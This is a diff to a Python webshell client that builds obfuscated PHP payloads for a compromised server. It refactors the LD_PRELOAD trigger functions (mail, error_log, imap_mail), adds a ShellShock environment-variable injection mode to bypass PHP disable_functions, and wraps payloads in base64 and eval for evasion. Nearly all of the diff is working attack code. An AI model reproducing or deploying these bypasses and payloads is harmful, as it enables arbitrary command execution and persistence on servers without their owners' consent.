@@ -393,6 +393,19 @@ def decode_g(result, key: str, options: bool):
         return b"" if options else ""
 
 
+def _get_trigger_func_code(trigger_func):
+    code = ""
+    if (trigger_func == "mail"):
+        code = "mail('','','','');"
+    elif (trigger_func == "error_log"):
+        code = "error_log('',1);"
+    elif (trigger_func == "mb_send_mail"):
+        code = "mb_send_mail('','','');"
+    elif (trigger_func == "imap_mail"):
+        code = 'imap_mail("1@a.com","0","1","2","3");'
+    return code
+
+
 def _bypass_open_base_dir():
     return """$dir=pos(glob("./*", GLOB_ONLYDIR));
 $cwd=getcwd();
@@ -543,7 +556,6 @@ file_put_contents('/tmp/%s',$o);""" % (phpcode, temp_filename)
         phpcode = "file_put_contents('ftp://%s:%s/a', base64_decode('%s'));sleep(0.8);$fn='%s';print(file_get_contents('http://127.0.0.1:%s/'.$fn));unlink('/tmp/'.$fn);" % (
             host, random_ftp_port, generate_base64_socks_code_payload(host, port, phpcode), temp_filename, php_server_port)
 
-
     params_dict[raw_key][password] = phpcode
     res = Session.post(url, verify=False, **params_dict)
 
@@ -598,7 +610,8 @@ def send(phpcode: str, raw: bool = False, **extra_params):
         phpcode += f"""{encode_tail}print("{tail}");"""
 
         if (gget("webshell.disable_base64_decode", "webshell")):
-            phpcode = """$_="";$__=new SplFileObject("data://text/plain;base64,%s");foreach($__ as $___){$_.=$___."\\n";}eval($_);""" % (base64_encode(phpcode))
+            phpcode = """$_="";$__=new SplFileObject("data://text/plain;base64,%s");foreach($__ as $___){$_.=$___."\\n";}eval($_);""" % (
+                base64_encode(phpcode))
         elif (php_v7):
             phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
         else:
@@ -1399,16 +1412,8 @@ $y = [new Z()];
 json_encode([&$y]);
 $o=$GLOBAL['o'];""" % (base64_encode(command), print_command)
     elif (bdf_mode == 4):  # LD_PRELOAD
-        ld_preload_func = gget("webshell.ld_preload_func", "webshell")
-        ld_preload_command = ""
-        if (ld_preload_func == "mail"):
-            ld_preload_command = "mail('','','','');"
-        elif (ld_preload_func == "error_log"):
-            ld_preload_command = "error_log('',1);"
-        elif (ld_preload_func == "mb_send_mail"):
-            ld_preload_command = "mb_send_mail('','','');"
-        elif (ld_preload_func == "imap_mail"):
-            ld_preload_command = 'imap_mail("1@a.com","0","1","2","3");'
+        trigger_code = _get_trigger_func_code(
+            gget("webshell.ld_preload_func", "webshell"))
         return """$p="/tmp/%s";
 putenv("cmd=".base64_decode("%s"));
 putenv("rpath=$p");
@@ -1419,7 +1424,7 @@ unlink($p);
 %s""" % (str(uuid4()),
          base64_encode(command),
          gget("webshell.ld_preload_path", "webshell"),
-         ld_preload_command,
+         trigger_code,
          print_command)
     elif (bdf_mode == 5):  # FFI
         return """$f=FFI::cdef("void *popen(const char *command, const char *type);
@@ -2295,6 +2300,27 @@ $o=ob_get_contents();
 ob_end_clean();
 %s
 """ % (base64_encode(command), print_command)
+    elif (bdf_mode == 16):  # ShellShock
+        trigger_code = _get_trigger_func_code(
+            gget("webshell.shellshock_func", "webshell"))
+        if trigger_code.startswith("mail"):
+            trigger_code = 'mail("a@127.0.0.1", "", "", "-bv");'
+        return """
+function shellshock($cmd) {
+    if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
+        $p="/tmp/%s";
+        putenv("PHP_LOL=() { x; }; $cmd > $p 2>&1");
+        %s
+        echo @file_get_contents($p);
+        @unlink($p);
+    }
+}
+ob_start();
+shellshock(base64_decode("%s"));
+$o=ob_get_contents();
+ob_end_clean();
+%s
+""" % (str(uuid4()), trigger_code, base64_encode(command), print_command)
     elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
